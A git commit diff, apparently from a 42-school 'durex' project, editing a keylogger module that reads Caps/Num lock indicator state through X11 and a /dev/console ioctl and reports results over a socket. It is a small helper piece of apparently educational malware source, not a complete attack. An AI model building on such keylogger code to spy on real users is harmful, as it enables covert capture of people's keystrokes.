8fde1b15621e7e0342eaa5bfba697e003af061ef
GBO <gbourgeo@student.42.fr>
2018-11-15 19:44:37 +0100

    searching a way to get lockers stae at keylogging start

--- durex/srcs/keylogger/get_keystate.c
+++ durex/srcs/keylogger/get_keystate.c
@@ -2,18 +2,23 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-int					get_keystate(int keybit, int socket)
+#include <sys/ioctl.h>
+#include <linux/kd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+#include <errno.h>
+
+int			get_keystate(int keybit, int socket)
 {
-  Display		*display;
-  char			*monitor;
+  Display	*display;
+  char		*monitor;
   unsigned	state;
 
-	monitor = getenv("DISPLAY");
-	if (!monitor) {
-		dprintf(socket, "Can't get monitor to find Lockers states.\n");
-		return 0;
-	}
-	display = XOpenDisplay((monitor) ? monitor : ":0");
+//	monitor = getenv("DISPLAY");
+	monitor = ":0";
+	display = XOpenDisplay(monitor);
 	if (!display) {
 		dprintf(socket, "Can't get display to find Lockers states.\n");
 		return 0;
@@ -22,5 +27,24 @@ int					get_keystate(int keybit, int socket)
 		dprintf(socket, "Can't get indicator state for Lockers.\n");
 		return 0;
 	}
+	return (state & keybit);
+}
+
+int			get_keystate2(int keybit, int socket)
+{
+	int		fd;
+	char	state;
+
+	fd = open("/dev/console", O_WRONLY);
+	if (fd < 0) {
+		dprintf(socket, "Can't open /dev/console.\n");
+		return 0;
+	}
+	state = LED_CAP;
+	if (ioctl(fd, KDGKBLED, &state)) {
+		dprintf(socket, "ioctl: %s\n", strerror(errno));
+		return 0;
+	}
+	dprintf(socket, "state is %d\n", state);
 	return (state & keybit);
 }
